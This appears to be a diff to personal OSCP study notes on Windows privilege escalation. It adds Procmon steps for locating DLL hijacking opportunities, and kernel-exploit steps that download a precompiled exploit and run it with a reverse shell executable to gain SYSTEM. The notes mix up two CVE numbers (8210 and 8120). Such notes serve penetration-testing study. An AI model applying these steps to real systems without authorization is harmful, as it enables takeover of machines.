@@ -185,6 +185,8 @@ net start filepermsvc
 ```
 
 ## Service Exploits - DLL Hijacking
+![image](https://github.com/nuricheun/OSCP/assets/14031269/620f04b8-a056-4443-9dc7-07ec8cfb6763)
+![image](https://github.com/nuricheun/OSCP/assets/14031269/1c49c786-6941-4c57-a1b5-8708ec418717)
 ```bash
 # Check if the user has start/stop service over the services
 accesschk.exe /accepteula -uvqc user dllsvc
@@ -192,12 +194,17 @@ accesschk.exe /accepteula -uvqc user dllsvc
 # Check the service configuration
 sc qc dllsvc
 
-# Run Procmon as admin
-# Stop and clear the current capture(microscope icon/ one that's next next to it)
-# Press ctl+l to set  the filter
-# Proccess name -> dllhijackservice.exe
-
-# 
+0 Run Procmon as admin
+1. stop and clear the current capture(magnifying glass/white sheet) or Ctrl+E && Ctrl+X
+2. Ctrl+l to configure filger config
+3. select "Process Name" and type "dllhijackservice.exe
+4. click "add" and "ok"
+5. unselect "show registry activity(one above "Path")
+6. unselect "show network activity"(one in the middle)
+7. Start the capture again
+8. restart the service
+9 "NAME NOT FOUND" > check here
+10. If we can write one of the directories, we can hijack dll file
 ```
 
 # Registry
@@ -337,4 +344,29 @@ tasklist /v
 
 # we can use winpeas as well
  .\winPEASany.exe quiet processinfo
+```
+
+# Kernel exploit
+```bash
+# Windows Exploit Suggester: 
+https://github.com/bitsadmin/wesng
+
+# Precompiled Kernel Exploits: 
+https://github.com/SecWiki/windows-kernel-exploits
+# for more recent windows, watson is better
+Watson: https://github.com/rasta-mouse/Watson
+
+1. Extract the output of the systeminfo command:
+> systeminfo > systeminfo.txt
+2. Run wesng to find potential exploits:
+# python wes.py systeminfo.txt -i 'Elevation 
+of Privilege' --exploits-only | less
+3. Cross-reference results with compiled exploits: 
+https://github.com/SecWiki/windows-kernel-exploits
+4. Download the compiled exploit for CVE-2018-8210 onto 
+the Windows VM: https://github.com/SecWiki/windowskernel-exploits/blob/master/CVE-2018-8120/x64.exe
+5. Start a listener on Kali and run the exploit, providing it 
+with the reverse shell executable, which should run with 
+SYSTEM privileges:
+> .\x64.exe C:\PrivEsc\reverse.exe
 ```
